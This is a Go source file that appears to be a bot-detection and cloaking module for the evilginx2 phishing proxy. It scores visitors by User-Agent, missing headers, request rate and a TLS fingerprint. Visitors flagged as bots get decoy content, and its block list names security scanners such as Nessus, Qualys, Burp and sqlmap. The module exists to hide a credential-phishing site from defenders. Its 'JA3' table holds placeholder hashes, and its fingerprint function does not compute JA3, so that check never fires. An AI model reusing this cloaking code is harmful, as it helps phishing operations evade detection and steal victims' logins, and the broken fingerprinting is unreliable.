package core

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

const (
	SensitivityLow    = "low"
	SensitivityMedium = "medium"
	SensitivityHigh   = "high"
)

const (
	BotScoreThresholdLow    = 70
	BotScoreThresholdMedium = 50
	BotScoreThresholdHigh   = 30
)

var knownBotFingerprints = []string{
	"bot", "crawler", "spider", "scraper", "curl", "wget",
	"python-requests", "go-http-client", "java/", "ruby",
	"phantomjs", "headlesschrome", "selenium",
	"nikto", "nmap", "masscan", "nessus", "qualys",
	"acunetix", "burp", "zap", "sqlmap",
}

var knownBotJA3Hashes = map[string]string{
	"3b8d1ed0f1e3e3f3f3f3f3f3f3f3f3f3": "Generic Python requests",
	"4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d": "Curl default",
	"5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a": "Golang default HTTP client",
}

type BotGuard struct {
	cfg             *Config
	sensitivity     string
	spoofURL        string
	requestTracker  map[string]*requestPattern
	tlsFingerprints map[string]string
	mu              sync.RWMutex
}

type requestPattern struct {
	IP              string
	UserAgent       string
	RequestCount    int
	LastRequest     time.Time
	RequestTimes    []time.Time
	UniqueURIs      map[string]bool
	TLSFingerprint  string
	BotScore        int
	IsBot           bool
}

func NewBotGuard(cfg *Config) *BotGuard {
	bg := &BotGuard{
		cfg:             cfg,
		sensitivity:     SensitivityMedium,
		requestTracker:  make(map[string]*requestPattern),
		tlsFingerprints: make(map[string]string),
	}

	go bg.cleanupRoutine()

	return bg
}

func (bg *BotGuard) SetSensitivity(sensitivity string) {
	bg.mu.Lock()
	defer bg.mu.Unlock()

	switch sensitivity {
	case SensitivityLow, SensitivityMedium, SensitivityHigh:
		bg.sensitivity = sensitivity
		log.Info("BotGuard sensitivity set to: %s", sensitivity)
	default:
		log.Warning("Invalid sensitivity level: %s, defaulting to medium", sensitivity)
		bg.sensitivity = SensitivityMedium
	}
}

func (bg *BotGuard) SetSpoofURL(url string) {
	bg.mu.Lock()
	defer bg.mu.Unlock()
	bg.spoofURL = url
}

func (bg *BotGuard) AnalyzeRequest(req *http.Request, tlsState *tls.ConnectionState) (*requestPattern, bool) {
	bg.mu.Lock()
	defer bg.mu.Unlock()

	clientID := bg.getClientID(req)
	pattern, exists := bg.requestTracker[clientID]

	if !exists {
		pattern = &requestPattern{
			IP:           bg.getClientIP(req),
			UserAgent:    req.UserAgent(),
			RequestCount: 0,
			UniqueURIs:   make(map[string]bool),
			RequestTimes: make([]time.Time, 0),
		}
		bg.requestTracker[clientID] = pattern
	}

	now := time.Now()
	pattern.RequestCount++
	pattern.LastRequest = now
	pattern.RequestTimes = append(pattern.RequestTimes, now)
	pattern.UniqueURIs[req.URL.Path] = true

	if tlsState != nil {
		pattern.TLSFingerprint = bg.extractJA3Fingerprint(tlsState)
	}

	pattern.BotScore = bg.calculateBotScore(pattern, req)

	threshold := bg.getScoreThreshold()
	pattern.IsBot = pattern.BotScore >= threshold

	if pattern.IsBot {
		log.Warning("[BotGuard] Bot detected - IP: %s, UA: %s, Score: %d/%d",
			pattern.IP, pattern.UserAgent, pattern.BotScore, threshold)
	}

	return pattern, pattern.IsBot
}

func (bg *BotGuard) calculateBotScore(pattern *requestPattern, req *http.Request) int {
	score := 0

	ua := strings.ToLower(pattern.UserAgent)
	for _, botUA := range knownBotFingerprints {
		if strings.Contains(ua, botUA) {
			score += 30
			break
		}
	}

	if req.Header.Get("Accept-Language") == "" {
		score += 10
	}
	if req.Header.Get("Accept-Encoding") == "" {
		score += 10
	}

	if pattern.RequestCount > 10 {
		if len(pattern.RequestTimes) >= 10 {
			duration := time.Since(pattern.RequestTimes[len(pattern.RequestTimes)-10])
			requestsPerMinute := float64(10) / duration.Minutes()
			if requestsPerMinute > 30 {
				score += 20
			} else if requestsPerMinute > 20 {
				score += 10
			}
		}
	}

	if pattern.TLSFingerprint != "" {
		if _, isKnownBot := knownBotJA3Hashes[pattern.TLSFingerprint]; isKnownBot {
			score += 20
		}
	}

	if pattern.RequestCount > 5 && len(pattern.UniqueURIs) == 1 {
		score += 10
	}

	if score > 100 {
		score = 100
	}

	return score
}

func (bg *BotGuard) getScoreThreshold() int {
	switch bg.sensitivity {
	case SensitivityLow:
		return BotScoreThresholdLow
	case SensitivityHigh:
		return BotScoreThresholdHigh
	default:
		return BotScoreThresholdMedium
	}
}

func (bg *BotGuard) extractJA3Fingerprint(tlsState *tls.ConnectionState) string {

	if tlsState == nil {
		return ""
	}

	fingerprint := fmt.Sprintf("%d-%x-%d",
		tlsState.Version,
		tlsState.CipherSuite,
		len(tlsState.PeerCertificates))

	return fingerprint
}

func (bg *BotGuard) getClientID(req *http.Request) string {
	ip := bg.getClientIP(req)
	ua := req.UserAgent()
	return fmt.Sprintf("%s|%s", ip, ua)
}

func (bg *BotGuard) getClientIP(req *http.Request) string {
	if ip := req.Header.Get("X-Real-IP"); ip != "" {
		return ip
	}
	if ip := req.Header.Get("X-Forwarded-For"); ip != "" {
		parts := strings.Split(ip, ",")
		return strings.TrimSpace(parts[0])
	}

	ip := req.RemoteAddr
	if idx := strings.LastIndex(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	return ip
}

func (bg *BotGuard) ShouldBlock(pattern *requestPattern) bool {
	return pattern != nil && pattern.IsBot
}

func (bg *BotGuard) GetSpoofResponse(req *http.Request) *http.Response {
	bg.mu.RLock()
	spoofURL := bg.spoofURL
	bg.mu.RUnlock()

	if spoofURL == "" {
		return &http.Response{
			StatusCode: http.StatusForbidden,
			Body:       nil,
			Header:     make(http.Header),
		}
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}

	spoofReq, err := http.NewRequest("GET", spoofURL, nil)
	if err != nil {
		log.Error("[botguard] failed to create spoof request: %v", err)
		return &http.Response{
			StatusCode: http.StatusInternalServerError,
			Body:       nil,
			Header:     make(http.Header),
		}
	}

	spoofReq.Header.Set("User-Agent", req.UserAgent())
	spoofReq.Header.Set("Accept", req.Header.Get("Accept"))
	spoofReq.Header.Set("Accept-Language", req.Header.Get("Accept-Language"))

	resp, err := client.Do(spoofReq)
	if err != nil {
		log.Error("[botguard] failed to fetch spoof content: %v", err)
		fallbackResp := &http.Response{
			StatusCode: http.StatusFound,
			Header:     make(http.Header),
		}
		fallbackResp.Header.Set("Location", spoofURL)
		return fallbackResp
	}

	return resp
}

func (bg *BotGuard) cleanupRoutine() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		bg.mu.Lock()
		now := time.Now()
		
		for clientID, pattern := range bg.requestTracker {
			if now.Sub(pattern.LastRequest) > 30*time.Minute {
				delete(bg.requestTracker, clientID)
			}
		}
		
		for _, pattern := range bg.requestTracker {
			if len(pattern.RequestTimes) > 100 {
				pattern.RequestTimes = pattern.RequestTimes[len(pattern.RequestTimes)-100:]
			}
		}
		
		bg.mu.Unlock()
	}
}

func (bg *BotGuard) GetStats() map[string]interface{} {
	bg.mu.RLock()
	defer bg.mu.RUnlock()

	totalPatterns := len(bg.requestTracker)
	botCount := 0
	
	for _, pattern := range bg.requestTracker {
		if pattern.IsBot {
			botCount++
		}
	}

	return map[string]interface{}{
		"total_tracked":    totalPatterns,
		"bots_detected":    botCount,
		"sensitivity":      bg.sensitivity,
		"has_spoof_url":    bg.spoofURL != "",
	}
}
